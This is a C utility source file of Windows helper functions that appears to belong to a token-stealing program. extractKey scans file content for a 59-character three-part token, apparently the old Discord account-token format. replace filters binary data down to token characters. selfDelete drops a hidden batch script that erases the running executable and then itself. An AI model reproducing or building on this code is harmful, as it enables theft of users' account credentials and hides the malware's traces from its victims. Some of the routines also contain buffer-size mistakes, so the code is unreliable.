#pragma warning( disable: 6386 )

#include "Util.h"

LPWSTR extractKey(LPSTR fileContent) {

    LPWSTR retVal = 0;
    int splitRes = 0;
    BOOL found = FALSE;
    int wchars_num = MultiByteToWideChar(CP_UTF8, 0, fileContent, -1, NULL, 0);
    LPWSTR fileContentW = GlobalAlloc(GMEM_FIXED, wchars_num * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, fileContent, -1, fileContentW, wchars_num);
    split(fileContentW, L' ', -1, &splitRes);
    for (int i = 0; i < splitRes; i++) {
        int checkFormat = 0;
        LPWSTR curPart = split(fileContentW, L' ', i, NULL);
        split(curPart, L'.', -1, &checkFormat);
        if (strl(curPart) == 59 && checkFormat == 2) {
            LPWSTR part1 = split(curPart, L'.', 0, NULL);
            LPWSTR part2 = split(curPart, L'.', 1, NULL);
            LPWSTR part3 = split(curPart, L'.', 2, NULL);
            if (strl(part1) == 24 && strl(part2) == 6 && strl(part3) == 27) {
                retVal = GlobalAlloc(GMEM_FIXED, 60 * sizeof(WCHAR));
                StringCchCopyW(retVal, 60 * sizeof(WCHAR), curPart);
                found = TRUE;
            }
            GlobalFree(part1);
            GlobalFree(part2);
            GlobalFree(part3);
        }
        GlobalFree(curPart);
        if (found) {
            break;
        }
    }
    GlobalFree(fileContentW);
    return retVal;
}

void selfDelete() {

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    LPWSTR path = GlobalAlloc(GMEM_FIXED, MAX_PATH * sizeof(WCHAR));
    LPWSTR destrBat = GlobalAlloc(GMEM_FIXED, 500 * sizeof(WCHAR));
    LPWSTR appdata = GlobalAlloc(GMEM_FIXED, MAX_PATH * sizeof(WCHAR));
    LPWSTR location = GlobalAlloc(GMEM_FIXED, MAX_PATH * sizeof(WCHAR));
    PSTR pszB = 0;

    if (destrBat != NULL && location != NULL && path != NULL && appdata != NULL) {

        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata);
        GetModuleFileNameW(NULL, path, MAX_PATH);

        StringCchCopyW(location, MAX_PATH * sizeof(WCHAR), appdata);
        StringCchCatW(location, MAX_PATH * sizeof(WCHAR), L"\\del.bat");

        StringCchCopyW(destrBat, 500 * sizeof(WCHAR), L"ping localhost -n 1 && del \"");
        StringCchCatW(destrBat, 500 * sizeof(WCHAR), path);
        StringCchCatW(destrBat, 500 * sizeof(WCHAR), L"\"\r\nstart /b \"\" cmd /c del \"%~f0\"&exit /b");

        HANDLE bFile = CreateFileW(location, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        ULONG cbB = 0, cchB = (ULONG)strl(destrBat);
        cbB = WideCharToMultiByte(CP_UTF8, 0, destrBat, cchB, pszB, cbB, 0, 0);
        pszB = GlobalAlloc(GMEM_FIXED, cbB);
        WideCharToMultiByte(CP_UTF8, 0, destrBat, cchB, pszB, cbB, 0, 0);
        WriteFile(bFile, pszB, cbB, &cbB, 0);
        CloseHandle(bFile);
        GlobalFree(pszB);
    }

    CreateProcessW(NULL, location, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    GlobalFree(path);
    GlobalFree(destrBat);
    GlobalFree(appdata);
    GlobalFree(location);
    ExitProcess(EXIT_SUCCESS);
}


LPWSTR searchStr(LPWSTR str, LPWSTR substring)
{
    LPCWSTR a;
    LPCWSTR b;

    b = substring;

    if (*b == 0) {
        return (LPWSTR)str;
    }

    for (; *str != 0; str += 1) {
        if (*str != *b) {
            continue;
        }

        a = str;
        while (1) {
            if (*b == 0) {
                return (LPWSTR)str;
            }
            if (*a++ != *b++) {
                break;
            }
        }
        b = substring;
    }

    return NULL;
}

size_t strl(LPWSTR s) {
    size_t i = 0;
    while (s && *s != '\0') {
        s++;
        i++;
    }
    return i;
}

size_t strl2(LPSTR s) {
    size_t i = 0;
    while (s && *s != '\0') {
        s++;
        i++;
    }
    return i;
}

LPWSTR split(LPWSTR str, WCHAR delim, int numSplit, int* totalHits) {

    LPWSTR retVal = (LPWSTR)GlobalAlloc(GMEM_FIXED, strl(str) * sizeof(WCHAR) + 1);
    size_t strLen = strl(str);
    int hits = 0;
    int num = 0;
    for (size_t i = 0; i < strLen; i++) {
        if (str[i] == delim && retVal != NULL) {
            if (numSplit != -1 && hits == numSplit) {
                retVal[num] = L'\0';
                return retVal;
            }
            memset(retVal, 0, sizeof(retVal));
            num = 0;
            hits++;
            if (totalHits != NULL) {
                (*totalHits)++;
            }
        }
        else if (retVal != NULL) {
            retVal[num] = str[i];
            num++;
        }
    }
    if (numSplit != -1 && numSplit <= hits && retVal != NULL) {
        retVal[num] = L'\0';
        return retVal;
    }
    else {
        GlobalFree(retVal);
        return NULL;
    }
}

LPWSTR strchr42a(LPWSTR str, int ch){
    do {
        if (*str == ch) return str;
    } while (*str++);
    return NULL;
}

LPSTR replace(LPBYTE data, size_t bytes) {

    LPWSTR allc = (LPWSTR)L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_";

    LPSTR removeBinary = GlobalAlloc(GMEM_FIXED, bytes);
    for (size_t i = 0; i < bytes; i++) {

        if ((strchr42a(allc, data[i]) == NULL || data[i] == '\0') && removeBinary != NULL) {
            removeBinary[i] = ' ';
        }
        else if (removeBinary != NULL) {
            removeBinary[i] = data[i];
        }

    }
    if (removeBinary != NULL) {
        removeBinary[strl2(removeBinary)] = 0;
    }
    return removeBinary;
}